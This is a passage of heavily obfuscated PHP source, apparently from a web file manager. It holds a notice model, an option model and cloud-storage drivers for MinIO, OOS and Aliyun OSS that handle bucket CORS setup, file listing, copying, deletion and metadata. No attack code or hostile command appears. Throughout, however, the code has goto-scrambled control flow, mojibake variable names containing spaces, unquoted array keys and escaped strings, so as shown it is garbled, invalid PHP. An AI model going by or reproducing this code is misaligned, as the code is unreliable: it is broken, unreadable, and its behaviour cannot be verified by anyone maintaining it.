dãÑÑ≤Öﬂà; dãÑÑ≤Öﬂà: } $this->clearSystemPathLog($Bâ∫êõ¥ëç); goto A§’¬Ò‹¨â; A§’¬Ò‹¨â: return $cà›Á∞Ω¥‹; goto F±¿Õ“ï°¢; F±¿Õ“ï°¢: } private function clearSystemPathLog($Dé ⁄ÿ£Ñ∏) { $d ·Ûºâ®Ü =& $_SERVER[Æ¡î¢≠¯™]; if (count($Dé ⁄ÿ£Ñ∏) == 0) { return; } $DöÜƒ∫éÓŸ = array($d ·Ûºâ®Ü[372] => array($d ·Ûºâ®Ü[7], array_unique($Dé ⁄ÿ£Ñ∏))); $this->where($DöÜƒ∫éÓŸ)->delete(); } public function deviceList($Aéß≤„ï—§, $e≤áÇ·Æâ∂ = 0) { $Aê»íÆ‹êÔ =& $_SERVER[Æ¡î¢≠¯™]; $b«êŸﬂŸøÈ = array($Aê»íÆ‹êÔ[1397] => $Aéß≤„ï—§, $Aê»íÆ‹êÔ[194] => array($Aê»íÆ‹êÔ[916], $e≤áÇ·Æâ∂), $Aê»íÆ‹êÔ[29] => $Aê»íÆ‹êÔ[2001]); $A”¨◊ÖÍÆ› = array(); $Càåé“ÕﬂÛ = $this->field($Aê»íÆ‹êÔ[2419])->where($b«êŸﬂŸøÈ)->order($Aê»íÆ‹êÔ[2243])->limit(50)->select(); foreach ($Càåé“ÕﬂÛ as $bã»≤«Œ›‘ => $C®≤—≈ﬁ—) { goto Còﬂ≈Ñà›å; fˆ≠º∆◊¿É: $this->ipAddress($C®≤—≈ﬁ—); $C®≤—≈ﬁ—[$Aê»íÆ‹êÔ[409]] = $c”éñÇ£Íº; $A”¨◊ÖÍÆ›[$Dâßº‡…±˘] = $C®≤—≈ﬁ—; goto DÖ˘ä∂∫≤; DÒìÜïäÇ‡: unset($c”éñÇ£Íº[$Aê»íÆ‹êÔ[2409]]); $Dâßº‡…±˘ = $this->deviceType($c”éñÇ£Íº[$Aê»íÆ‹êÔ[2234]]); if (isset($A”¨◊ÖÍÆ›[$Dâßº‡…±˘])) { continue; } goto fˆ≠º∆◊¿É; Còﬂ≈Ñà›å: if ($bã»≤«Œ›‘ > 0 && abs($C®≤—≈ﬁ—[$Aê»íÆ‹êÔ[194]] - $Càåé“ÕﬂÛ[$bã»≤«Œ›‘ - 1][$Aê»íÆ‹êÔ[194]]) < 5) { continue; } $c”éñÇ£Íº = json_decode($C®≤—≈ﬁ—[$Aê»íÆ‹êÔ[409]], !0); $C®≤—≈ﬁ—[$Aê»íÆ‹êÔ[2409]] = isset($c”éñÇ£Íº[$Aê»íÆ‹êÔ[2409]]) ? $c”éñÇ£Íº[$Aê»íÆ‹êÔ[2409]] : $Aê»íÆ‹êÔ[33]; goto DÒìÜïäÇ‡; DÖ˘ä∂∫≤: } return array_values($A”¨◊ÖÍÆ›); } public function deviceType($a∏ÿÈ¬∆œ⁄) { return $a∏ÿÈ¬∆œ⁄; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\56\156\157\164\151\143\145\x4c\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\143\x6f\156\164\x65\156\164", "\141\x75\x74\x68", "\x6d\x6f\x64\145", "\164\x69\x6d\145", "\164\x79\160\x65", "\154\x65\x76\x65\154", "\145\156\141\x62\154\x65", "\163\157\x72\x74"); public function listData($F’»ÿ¯è¨ó = false, $e»“®ë©≥è = "\163\x6f\162\164", $cåÓÉ›÷Æ⁄ = false) { return parent::listData($F’»ÿ¯è¨ó, $e»“®ë©≥è, $cåÓÉ›÷Æ⁄); } public function add($cÌ—á¨⁄í≠) { goto D¿›‚í¨ë’; D¿›‚í¨ë’: $A‡µí†à®Á =& $_SERVER[Æ¡î¢≠¯™]; $C™—ÀÖ≠î¡ = $this->findByName($cÌ—á¨⁄í≠[$A‡µí†à®Á[28]]); if ($C™—ÀÖ≠î¡) { return !1; } goto b»ù€ﬁ«ªß; b»ù€ﬁ«ªß: $A“Û€ÓÑ≤ﬁ = time(); if ($cÌ—á¨⁄í≠[$A‡µí†à®Á[12]] == $A‡µí†à®Á[2420]) { $A“Û€ÓÑ≤ﬁ = strtotime($cÌ—á¨⁄í≠[$A‡µí†à®Á[197]]); } $cÌ—á¨⁄í≠[$A‡µí†à®Á[197]] = $A“Û€ÓÑ≤ﬁ; goto Bì’åÖà¥Ã; Bì’åÖà¥Ã: return parent::insert($cÌ—á¨⁄í≠); goto c¯‚◊°Ó∆â; c¯‚◊°Ó∆â: } public function update($aÀ´∆Ë—≠â, $A∆üÌ¿¨∏ò) { goto D…íÕ„º¯…; Fº⁄ªàÓéÌ: $A∆üÌ¿¨∏ò[$E£Œ»≈Öèì[197]] = $B–üÜ∞¶Ûù; return parent::update($aÀ´∆Ë—≠â, $A∆üÌ¿¨∏ò); goto dØ∂£ÑÌÇ; D…íÕ„º¯…: $E£Œ»≈Öèì =& $_SERVER[Æ¡î¢≠¯™]; $D–‰àãı€Ü = $this->listData($aÀ´∆Ë—≠â); $e„ªˆı·©Œ = $this->findByName($A∆üÌ¿¨∏ò[$E£Œ»≈Öèì[28]]); goto FæÖ∑ÛÓËø; FæÖ∑ÛÓËø: if (!$D–‰àãı€Ü || $e„ªˆı·©Œ && $e„ªˆı·©Œ[$E£Œ»≈Öèì[372]] != $D–‰àãı€Ü[$E£Œ»≈Öèì[372]]) { return !1; } $B–üÜ∞¶Ûù = time(); if ($A∆üÌ¿¨∏ò[$E£Œ»≈Öèì[12]] == $E£Œ»≈Öèì[2420]) { $B–üÜ∞¶Ûù = strtotime($A∆üÌ¿¨∏ò[$E£Œ»≈Öèì[197]]); } goto Fº⁄ªàÓéÌ; dØ∂£ÑÌÇ: } public function remove($Eüß©√¯æå) { $AââÉ§Êú£ = $this->listData($Eüß©√¯æå); if (!$AââÉ§Êú£ || $AââÉ§Êú£[$_SERVER[Æ¡î¢≠¯™][1066]]) { return !1; } return parent::remove($Eüß©√¯æå); } public function sort($Eˆô™—ÁÙ∞, $B·ä∏Ö˜îÁ) { return parent::update($Eˆô™—ÁÙ∞, $B·ä∏Ö˜îÁ); } public function enable($F√«ûÈù¯¯, $A≠¢É‘ëä£) { return parent::update($F√«ûÈù¯¯, array($_SERVER[Æ¡î¢≠¯™][2421] => $A≠¢É‘ëä£)); } private function initUserOption() { $Dœºà„’¨≤ =& $_SERVER[Æ¡î¢≠¯™]; $this->optionType = $Dœºà„’¨≤[2422]; $this->modelType = $Dœºà„’¨≤[2423]; $this->field = array($Dœºà„’¨≤[2424], $Dœºà„’¨≤[28], $Dœºà„’¨≤[197], $Dœºà„’¨≤[29], $Dœºà„’¨≤[2425], $Dœºà„’¨≤[681], $Dœºà„’¨≤[190]); } public function userNoticeGet($Dø®à¥ÉæÎ = false) { $this->initUserOption(); return parent::listData($Dø®à¥ÉæÎ, $_SERVER[Æ¡î¢≠¯™][372], !0); } public function userNoticeAdd($cÀùæ∫⁄ó≈) { $B™Œ®ˆêóŒ =& $_SERVER[Æ¡î¢≠¯™]; $this->initUserOption(); $eÒˆñ™ßÉ◊ = $this->findByKey($B™Œ®ˆêóŒ[2424], $cÀùæ∫⁄ó≈[$B™Œ®ˆêóŒ[372]]); if ($eÒˆñ™ßÉ◊) { return !0; } $F«˘ºò´Ì„ = array($B™Œ®ˆêóŒ[2424] => $cÀùæ∫⁄ó≈[$B™Œ®ˆêóŒ[372]], $B™Œ®ˆêóŒ[28] => $cÀùæ∫⁄ó≈[$B™Œ®ˆêóŒ[28]], $B™Œ®ˆêóŒ[197] => $cÀùæ∫⁄ó≈[$B™Œ®ˆêóŒ[197]], $B™Œ®ˆêóŒ[29] => isset($cÀùæ∫⁄ó≈[$B™Œ®ˆêóŒ[29]]) ? $cÀùæ∫⁄ó≈[$B™Œ®ˆêóŒ[29]] : 1, $B™Œ®ˆêóŒ[2425] => isset($cÀùæ∫⁄ó≈[$B™Œ®ˆêóŒ[2425]]) ? $cÀùæ∫⁄ó≈[$B™Œ®ˆêóŒ[2425]] : 0, $B™Œ®ˆêóŒ[681] => 0, $B™Œ®ˆêóŒ[190] => 0); return parent::insert($F«˘ºò´Ì„); } public function userNoticeEdit($F◊µµ‚†ó¢, $fÏ§ø≈Öõ‚) { $this->initUserOption(); return parent::update($F◊µµ‚†ó¢, $fÏ§ø≈Öõ‚); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\164\x65\x6d\x5f\x6f\160\164\x69\157\156"; protected $jsonField = array("\x6d\x65\x6e\x75", "\162\157\154\x65", "\x72\x6f\154\x65\x47\162\x6f\x75\160", "\x72\x65\147\151\x73\x74", "\x65\155\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($FÚîÖù⁄Èƒ) { return "\123\171\x73\x74\145\x6d\117\160\164\x69\x6f\156\x5f{$FÚîÖù⁄Èƒ}"; } protected function optionDefault($eîêú∆üÕÉ = '') { $Dµﬂ¬ÀÊµ‚ =& $_SERVER[Æ¡î¢≠¯™]; if ($eîêú∆üÕÉ == $Dµﬂ¬ÀÊµ‚[33]) { return $GLOBALS[$Dµﬂ¬ÀÊµ‚[6]][$Dµﬂ¬ÀÊµ‚[2426]]; } } } goto e·®õÕŒ®æ; FÿÒ¥ ≤ØŒ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($DíÜ√·é¶Ù) { parent::__construct($DíÜ√·é¶Ù); $this->signatureVersion($_SERVER[Æ¡î¢≠¯™][207]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($bçŸøÒùåÆ) { parent::__construct($bçŸøÒùåÆ); $this->signatureVersion($_SERVER[Æ¡î¢≠¯™][207]); } public function fileOutLink($få©Í¿·∂ø) { $Fò«⁄··√© =& $_SERVER[Æ¡î¢≠¯™]; if (substr($få©Í¿·∂ø, 0, 7) == $Fò«⁄··√©[1094]) { $få©Í¿·∂ø = $Fò«⁄··√©[1095] . substr($få©Í¿·∂ø, 7); } header($Fò«⁄··√©[163] . $få©Í¿·∂ø); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($fÿŸú·úÆŸ) { parent::__construct(); include_once SDK_DIR . $_SERVER[Æ¡î¢≠¯™][1149]; $this->_init($fÿŸú·úÆŸ); } public function _init($e¡≠æÙÿΩ¢) { foreach ($e¡≠æÙÿΩ¢ as $dÀ…ê¡∞áÚ => $cˆßƒ±•≈ã) { if (isset($this->{$dÀ…ê¡∞áÚ})) { $this->{$dÀ…ê¡∞áÚ} = $cˆßƒ±•≈ã; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Æ¡î¢≠¯™][1150], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto EÃöÇ«ﬂµã; EÃöÇ«ﬂµã: $fØ≥¥Õ°çÚ =& $_SERVER[Æ¡î¢≠¯™]; $bõÈ»´‚∑Õ = new OSS\Model\CorsConfig(); $CÌª«ò˘ËÙ = new OSS\Model\CorsRule(); goto aŒÈÁÙú§√; FËã¯ØÃ∫ç: $bõÈ»´‚∑Õ->addRule($CÌª«ò˘ËÙ); try { $this->client->putBucketCors($this->bucket, $bõÈ»´‚∑Õ); } catch (OSS\Core\OssException $cıääœƒí≥) { return !1; } return !0; goto cãÕ⁄ñÛ¥≤; aŒÈÁÙú§√: $CÌª«ò˘ËÙ->addAllowedOrigin($fØ≥¥Õ°çÚ[1151]); $CÌª«ò˘ËÙ->addAllowedMethod($fØ≥¥Õ°çÚ[1152]); $CÌª«ò˘ËÙ->addAllowedMethod($fØ≥¥Õ°çÚ[1153]); goto Dæ˘äÌ´à◊; Dæ˘äÌ´à◊: $CÌª«ò˘ËÙ->addAllowedMethod($fØ≥¥Õ°çÚ[1154]); $CÌª«ò˘ËÙ->addAllowedMethod($fØ≥¥Õ°çÚ[1155]); $CÌª«ò˘ËÙ->addAllowedMethod($fØ≥¥Õ°çÚ[162]); goto B°√≤ûÔƒê; B°√≤ûÔƒê: $CÌª«ò˘ËÙ->setMaxAgeSeconds(600); $CÌª«ò˘ËÙ->addExposeHeader($fØ≥¥Õ°çÚ[1156]); $CÌª«ò˘ËÙ->addAllowedHeader($fØ≥¥Õ°çÚ[1151]); goto FËã¯ØÃ∫ç; cãÕ⁄ñÛ¥≤: } public function getBucketCors() { goto Aÿê≈ÒÒ¥Ú; A™„⁄úãŸÇ: if (!$fœ¯·¶´Èò || !($c“ÿŸ“ãÉ = $fœ¯·¶´Èò->getRules())) { return null; } $DÛ¥¢«´◊É = $c“ÿŸ“ãÉ[0]->getAllowedOrigins(); $DêÓ™øÖÍ· = $c“ÿŸ“ãÉ[0]->getAllowedMethods(); goto BÙ€è°õàê; Aÿê≈ÒÒ¥Ú: $FﬂŒƒ¢ ⁄© =& $_SERVER[Æ¡î¢≠¯™]; $fœ¯·¶´Èò = null; try { $fœ¯·¶´Èò = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $f‘›…—ü’≠) { return null; } goto A™„⁄úãŸÇ; BÙ€è°õàê: $CÂÉ§à™√∑ = $c“ÿŸ“ãÉ[0]->getMaxAgeSeconds(); $B™èµ—øÜÍ = $c“ÿŸ“ãÉ[0]->getExposeHeaders(); $f£˘öˆõ®Õ = $c“ÿŸ“ãÉ[0]->getAllowedHeaders(); goto DäÌ‹ Îâÿ; DäÌ‹ Îâÿ: return array($FﬂŒƒ¢ ⁄©[182] => isset($DÛ¥¢«´◊É[0]) ? $DÛ¥¢«´◊É[0] : $FﬂŒƒ¢ ⁄©[33], $FﬂŒƒ¢ ⁄©[186] => $DêÓ™øÖÍ·, $FﬂŒƒ¢ ⁄©[1157] => $CÂÉ§à™√∑, $FﬂŒƒ¢ ⁄©[1158] => isset($B™èµ—øÜÍ[0]) ? $B™èµ—øÜÍ[0] : $FﬂŒƒ¢ ⁄©[33], $FﬂŒƒ¢ ⁄©[184] => isset($f£˘öˆõ®Õ[0]) ? $f£˘öˆõ®Õ[0] : $FﬂŒƒ¢ ⁄©[33]); goto B©´¢¢èä±; B©´¢¢èä±: } public function isBucketCors() { goto B˜ÖØ∏âë∏; B˜ÖØ∏âë∏: $a” »ı®  =& $_SERVER[Æ¡î¢≠¯™]; $D’ ûÉÙ˜Ó = $this->getBucketCors(); if (!$D’ ûÉÙ˜Ó || !is_array($D’ ûÉÙ˜Ó)) { return !1; } goto DåéÚ≈äá…; eﬁ¶Â‹†ı…: $d‚–ßÃã€ﬁ = array($a” »ı® [187], $a” »ı® [188], $a” »ı® [189], $a” »ı® [190], $a” »ı® [191]); $b¬øΩæú›Ã = array_diff($d‚–ßÃã€ﬁ, $e≠ÌπèéèÜ); return empty($b¬øΩæú›Ã); goto Fúù∑øÆÊ›; DåéÚ≈äá…: if ($D’ ûÉÙ˜Ó[$a” »ı® [182]] != $a” »ı® [183] || $D’ ûÉÙ˜Ó[$a” »ı® [184]] != $a” »ı® [183]) { return !1; } $e≠ÌπèéèÜ = array_map($a” »ı® [185], $D’ ûÉÙ˜Ó[$a” »ı® [186]]); if (!is_array($e≠ÌπèéèÜ)) { $e≠ÌπèéèÜ = array(); } goto eﬁ¶Â‹†ı…; Fúù∑øÆÊ›: } public function mkfile($Cû’ΩÉÂ´°, $cÉîËôΩÊ€ = '', $DÇÿáÿà≠å = REPEAT_RENAME) { $D¨ƒ©èÖ≥‡ = $this->setContent($Cû’ΩÉÂ´°, $cÉîËôΩÊ€); if ($D¨ƒ©èÖ≥‡ !== !1) { return $this->getPathOuter($Cû’ΩÉÂ´°); } return !1; } public function mkdir($bõÙ∫¶©úù, $E©∏„±π≤Ù = REPEAT_SKIP) { if ($this->_isFolder($bõÙ∫¶©úù)) { return $this->getPathOuter($bõÙ∫¶©úù); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($bõÙ∫¶©úù)); } catch (OSS\Core\OssException $a›ﬁ∂ä˜ê) { return !1; } return $this->getPathOuter($bõÙ∫¶©úù); } private function fileList($e„±˘‹Öÿ˜, $C†á≠ú∑Ìü = '', $cÀ–ô∫§±Ü = 0) { goto b‡Ö™ë∫¡Ø; A“ƒªÖíÉ›: $fÚâ»≠ÉåÆ = $fÍÑ≤µÉ∫∂[33]; $D¢ÂÙ≥Ç‚Ç = 1000; $aÀ≈ëıâ—› = $D∑ßóª‚™Í = array(); goto aùıˆ¶üÆ; b‡Ö™ë∫¡Ø: $fÍÑ≤µÉ∫∂ =& $_SERVER[Æ¡î¢≠¯™]; $e„±˘‹Öÿ˜ = trim($e„±˘‹Öÿ˜, $fÍÑ≤µÉ∫∂[8]); $fÈãè¬¥Ëæ = empty($e„±˘‹Öÿ˜) ? $fÍÑ≤µÉ∫∂[33] : $e„±˘‹Öÿ˜ . $fÍÑ≤µÉ∫∂[8]; goto A“ƒªÖíÉ›; aùıˆ¶üÆ: while (!0) { $A›⁄êÕ°´ë = array($fÍÑ≤µÉ∫∂[1159] => $C†á≠ú∑Ìü, $fÍÑ≤µÉ∫∂[193] => $fÈãè¬¥Ëæ, $fÍÑ≤µÉ∫∂[1160] => $D¢ÂÙ≥Ç‚Ç, $fÍÑ≤µÉ∫∂[1161] => $fÚâ»≠ÉåÆ); try { $cüìï™§≥… = $this->client->listObjects($this->bucket, $A›⁄êÕ°´ë); } catch (OSS\Core\OssException $FË•úùÈ∏¶) { break; } $fÚâ»≠ÉåÆ = $cüìï™§≥…->getNextMarker(); $FÑÂ¢Ö®ÿ» = $cüìï™§≥…->getObjectList(); $fÇü∆–µ£Ø = $cüìï™§≥…->getPrefixList(); foreach ($FÑÂ¢Ö®ÿ» as $E–ﬂâ¢¬Î—) { if ($E–ﬂâ¢¬Î—->getKey() == $fÈãè¬¥Ëæ) { continue; } $Dôû¬±Îéæ = $E–ﬂâ¢¬Î—->getKey(); if ($cÀ–ô∫§±Ü) { $Dôû¬±Îéæ = array($fÍÑ≤µÉ∫∂[28] => $Dôû¬±Îéæ, $fÍÑ≤µÉ∫∂[87] => $E–ﬂâ¢¬Î—->getSize(), $fÍÑ≤µÉ∫∂[197] => strtotime($E–ﬂâ¢¬Î—->getLastModified())); } $D∑ßóª‚™Í[] = $Dôû¬±Îéæ; } foreach ($fÇü∆–µ£Ø as $F¡á÷°àï¯) { $aÀ≈ëıâ—›[] = $F¡á÷°àï¯->getPrefix(); } if ($fÚâ»≠ÉåÆ === $fÍÑ≤µÉ∫∂[33]) { break; } } return array($fÍÑ≤µÉ∫∂[84] => $aÀ≈ëıâ—›, $fÍÑ≤µÉ∫∂[83] => $D∑ßóª‚™Í); goto CπÖΩ©¯º„; CπÖΩ©¯º„: } public function copyFile($dô€ ﬂ‹ñ¢, $Bãêâ¥†ΩÃ) { $eŸå‰≠≥©√ = $this->size($dô€ ﬂ‹ñ¢); if ($eŸå‰≠≥©√ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $dô€ ﬂ‹ñ¢, $this->bucket, $this->pathEncode($Bãêâ¥†ΩÃ)); } catch (OSS\Core\OssException $DìàŸ´≈òä) { return !1; } return !0; } return $this->multiCopyObject($dô€ ﬂ‹ñ¢, $Bãêâ¥†ΩÃ, $eŸå‰≠≥©√); } private function multiCopyObject($DÀ–«„ËîÔ, $bàŒ¨ﬁéŸ”, $B‰ŒìâÂÇØ) { $b√‰∆ŒéÖœ =& $_SERVER[Æ¡î¢≠¯™]; try { goto E€áƒÑ‡É‡; aÆØ◊•í´⁄: $b‘™∞¬≠ë° = array(); foreach ($A‰âÕ´Ã§Ü as $AÛÜñêÈäì => $E˜º∏èÑ¿) { $b‘™∞¬≠ë°[] = array($b√‰∆ŒéÖœ[1166] => $AÛÜñêÈäì + 1, $b√‰∆ŒéÖœ[1167] => $E˜º∏èÑ¿); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($bàŒ¨ﬁéŸ”), $bÑ§∫ùœâõ, $b‘™∞¬≠ë°); goto E∑ÓÉﬂÑÆ’; DÊ¬Û˜èü“: $FÉ¥∫çıí¬ = $this->osChunkSize(); $CØäõ‹•’  = $this->client->generateMultiuploadParts($B‰ŒìâÂÇØ, $FÉ¥∫çıí¬); foreach ($CØäõ‹•’  as $AÛÜñêÈäì => $B„Ãƒ∞√Ù†) { $cÊåº´∞˜‰ = $Aª°à·®øã + (int) $B„Ãƒ∞√Ù†[$b√‰∆ŒéÖœ[1163]]; $B±åï˜úæï = (int) $B„Ãƒ∞√Ù†[$b√‰∆ŒéÖœ[331]] + $cÊåº´∞˜‰ - 1; $bÈÂüãç» = array($b√‰∆ŒéÖœ[1164] => $cÊåº´∞˜‰, $b√‰∆ŒéÖœ[1165] => $B±åï˜úæï); $A‰âÕ´Ã§Ü[] = $this->client->uploadPartCopy($this->bucket, $DÀ–«„ËîÔ, $this->bucket, $this->pathEncode($bàŒ¨ﬁéŸ”), $dßáÌÆ•åá, $bÑ§∫ùœâõ, $bÈÂüãç»); $dßáÌÆ•åá = $dßáÌÆ•åá + 1; } goto aÆØ◊•í´⁄; FîÏ∏¥”ûú: $dßáÌÆ•åá = 1; $Aª°à·®øã = 0; $A‰âÕ´Ã§Ü = array(); goto DÊ¬Û˜èü“; E€áƒÑ‡É‡: $dèñÖ„öŒ• = array(); if ($DµàÆëŒŒæ = $this->hashMd5($DÀ–«„ËîÔ)) { $dèñÖ„öŒ• = array(OSS\OssClient::OSS_HEADERS => array($b√‰∆ŒéÖœ[1162] => $DµàÆëŒŒæ)); } $bÑ§∫ùœâõ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($bàŒ¨ﬁéŸ”), $dèñÖ„öŒ•); goto FîÏ∏¥”ûú; E∑ÓÉﬂÑÆ’: } catch (OSS\Core\OssException $EÜöúÛÛä≈) { return !1; } return !0; } public function moveFile($A€áëÒ⁄ºß, $A∫≥£‘èÇû) { if ($this->copyFile($A€áëÒ⁄ºß, $A∫≥£‘èÇû)) { $this->remove($A€áëÒ⁄ºß); return !0; } return !1; } public function delFile($BÂä∑ÜÜˆÉ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($BÂä∑ÜÜˆÉ)); } catch (OSS\Core\OssException $C‡ª’¥êö“) { return !1; } return !0; } public function delFolder($F»¿Ÿ»ÙÌâ) { $Bî„ÙÖÂàò =& $_SERVER[Æ¡î¢≠¯™]; $A†⁄€èåÃâ = $this->fileList($F»¿Ÿ»ÙÌâ); if (!empty($F»¿Ÿ»ÙÌâ) && !in_array(trim($F»¿Ÿ»ÙÌâ, $Bî„ÙÖÂàò[8]) . $Bî„ÙÖÂàò[8], $A†⁄€èåÃâ[$Bî„ÙÖÂàò[83]])) { $A†⁄€èåÃâ[$Bî„ÙÖÂàò[83]][] = trim($F»¿Ÿ»ÙÌâ, $Bî„ÙÖÂàò[8]) . $Bî„ÙÖÂàò[8]; } foreach (array_chunk($A†⁄€èåÃâ[$Bî„ÙÖÂàò[83]], 1000) as $Câ˜ﬁûñùó) { try { $this->client->deleteObjects($this->bucket, $Câ˜ﬁûñùó); } catch (OSS\Core\OssException $aûπç§ı”ú) { continue; } } return !0; } public function rename($C…±ìÖÈå∏, $Dè£ù⁄á√„) { return $this->renameObject($C…±ìÖÈå∏, $Dè£ù⁄á√„); } private function fileInfo($có¯ƒ∞«Ã∆, $EÒÏπÏÑ÷Õ = array()) { goto B©·ëáçÔ; B©·ëáçÔ: $e§∏‰óÌâ‡ =& $_SERVER[Æ¡î¢≠¯™]; $C®öå€≥‚® = array($e§∏‰óÌâ‡[28] => $this->pathThis($có¯ƒ∞«Ã∆), $e§∏‰óÌâ‡[85] => $this->getPathOuter($có¯ƒ∞«Ã∆), $e§∏‰óÌâ‡[29] => $e§∏‰óÌâ‡[174], $e§∏‰óÌâ‡[194] => 0, $e§∏‰óÌâ‡[117] => 0, $e§∏‰óÌâ‡[87] => 0, $e§∏‰óÌâ‡[167] => $this->ext($có¯ƒ∞«Ã∆), $e§∏‰óÌâ‡[195] => !0, $e§∏‰óÌâ‡[196] => !0); if (empty($EÒÏπÏÑ÷Õ)) { $D∆ãÌÕ·¡É = $this->objectMeta($có¯ƒ∞«Ã∆); if (!$D∆ãÌÕ·¡É) { return $C®öå€≥‚®; } $EÒÏπÏÑ÷Õ = array($e§∏‰óÌâ‡[117] => strtotime($D∆ãÌÕ·¡É[$e§∏‰óÌâ‡[1168]]), $e§∏‰óÌâ‡[87] => $D∆ãÌÕ·¡É[$e§∏‰óÌâ‡[1169]] + 0); } goto B∫˘Ë≤œÍÜ; B∫˘Ë≤œÍÜ: if (isset($EÒÏπÏÑ÷Õ[$e§∏‰óÌâ‡[87]])) { $C®öå€≥‚®[$e§∏‰óÌâ‡[87]] = $EÒÏπÏÑ÷Õ[$e§∏‰óÌâ‡[87]]; } if (isset($EÒÏπÏÑ÷Õ[$e§∏‰óÌâ‡[117]])) { $C®öå€≥‚®[$e§∏‰óÌâ‡[117]] = $EÒÏπÏÑ÷Õ[$e§∏‰óÌâ‡[117]]; } if (isset($EÒÏπÏÑ÷Õ[$e§∏‰óÌâ‡[197]]) && !trim($C®öå€≥‚®[$e§∏‰óÌâ‡[117]])) { $C®öå€≥‚®[$e§∏‰óÌâ‡[117]] = $EÒÏπÏÑ÷Õ[$e§∏‰óÌâ‡[197]]; } goto bÓ“‰Ÿ∆è»; bÓ“‰Ÿ∆è»: return $C®öå€≥‚®; goto E‹©ôÀıè¿; E‹©ôÀıè¿: } private function folderInfo($e±ÔÙﬂÖﬂÕ, $C¡îÚπÊ›Ü = array()) { $aÉèÉ—ü⁄Ω =& $_SERVER[Æ¡î¢≠¯™]; $cç£æ˘í´Ë = array($aÉèÉ—ü⁄Ω[28] => $this->pathThis($e±ÔÙﬂÖﬂÕ), $aÉèÉ—ü⁄Ω[85] => $this->getPathOuter($aÉèÉ—ü⁄Ω[8] . $e±ÔÙﬂÖﬂÕ), $aÉèÉ—ü⁄Ω[29] => $aÉèÉ—ü⁄Ω[86], $aÉèÉ—ü⁄Ω[194] => 0, $aÉèÉ—ü⁄Ω[117] => 0, $aÉèÉ—ü⁄Ω[195] => !0, $aÉèÉ—ü⁄Ω[196] => !0); if (empty($C¡îÚπÊ›Ü)) { $e±ÔÙﬂÖﬂÕ = rtrim($e±ÔÙﬂÖﬂÕ, $aÉèÉ—ü⁄Ω[8]) . $aÉèÉ—ü⁄Ω[8]; $EÚ≈íÿŒù√ = $this->objectMeta($e±ÔÙﬂÖﬂÕ); if (!$EÚ≈íÿŒù√) { return $cç£æ˘í´Ë; } $C¡îÚπÊ›Ü = array($aÉèÉ—ü⁄Ω[194] => $EÚ≈íÿŒù√[$aÉèÉ—ü⁄Ω[1170]][$aÉèÉ—ü⁄Ω[1171]], $aÉèÉ—ü⁄Ω[117] => strtotime($EÚ≈íÿŒù√[$aÉèÉ—ü⁄Ω[1168]])); } if (isset($C¡îÚπÊ›Ü[$aÉèÉ—ü⁄Ω[117]])) { $cç£æ˘í´Ë[$aÉèÉ—ü⁄Ω[117]] = $C¡îÚπÊ›Ü[$aÉèÉ—ü⁄Ω[117]]; } if (isset($C¡îÚπÊ›Ü[$aÉèÉ—ü⁄Ω[194]])) { $cç£æ˘í´Ë[$aÉèÉ—ü⁄Ω[194]] = $C¡îÚπÊ›Ü[$aÉèÉ—ü⁄Ω[194]]; } return $cç£æ˘í´Ë; } public function listPath($f¯˘ò≥ﬁ¥ô, $fÉ—›ËÚÿÚ = false) { $Eìﬁ™»©æ• =& $_SERVER[Æ¡î¢≠¯™]; $EÌá√á≤›Ô = $this->fileList($f¯˘ò≥ﬁ¥ô, $Eìﬁ™»©æ•[8], !0); foreach ($EÌá√á≤›Ô[$Eìﬁ™»©æ•[84]] as $a¢Û∂∆£√ñ => $CÙÏóåÆ€≤) { $EÌá√á≤›Ô[$Eìﬁ™»©æ•[84]][$a¢Û∂∆£√ñ] = $this->folderInfo($CÙÏóåÆ€≤, $CÙÏóåÆ€≤); } foreach ($EÌá√á≤›Ô[$Eìﬁ™»©æ•[83]] as $a¢Û∂∆£√ñ => $CÙÏóåÆ€≤) { $EÌá√á≤›Ô[$Eìﬁ™»©æ•[83]][$a¢Û∂∆£√ñ] = $this->fileInfo($CÙÏóåÆ€≤[$Eìﬁ™»©æ•[28]], $CÙÏóåÆ€≤); } return $EÌá√á≤›Ô; } public function has($DÑ¢áÁ≠Ïœ, $Cµí Á‹çÆ = false, $bØﬁ†Ëóé• = true) { goto D¢ºïÜÕä’; FÚ—œÒıûÏ: return !1; goto dÆù”ˆêà—; D¢ºïÜÕä’: $fñÌöû∑° =& $_SERVER[Æ¡î¢≠¯™]; $DÑ¢áÁ≠Ïœ = trim($DÑ¢áÁ≠Ïœ, $fñÌöû∑°[8]); $d¬∆≤“·‘€ = empty($DÑ¢áÁ≠Ïœ) ? $fñÌöû∑°[33] : $DÑ¢áÁ≠Ïœ . $fñÌöû∑°[8]; goto cﬂì¯ù—ãœ; F◊Û™õèË•: $c◊Àü◊„∂ı = 0; while (!0) { $C„ÃÙœÆ¶µ = array($fñÌöû∑°[1159] => $fñÌöû∑°[8], $fñÌöû∑°[193] => $d¬∆≤“·‘€, $fñÌöû∑°[1160] => $e¯∏‘ö¬∞π, $fñÌöû∑°[1161] => $f·âÃà∆æ«); try { $cÊ∫ïıÁÔ¨ = $this->client->listObjects($this->bucket, $C„ÃÙœÆ¶µ); } catch (OSS\Core\OssException $FÒπ›Ú‘≈ì) { break; } $f·âÃà∆æ« = $cÊ∫ïıÁÔ¨->getNextMarker(); 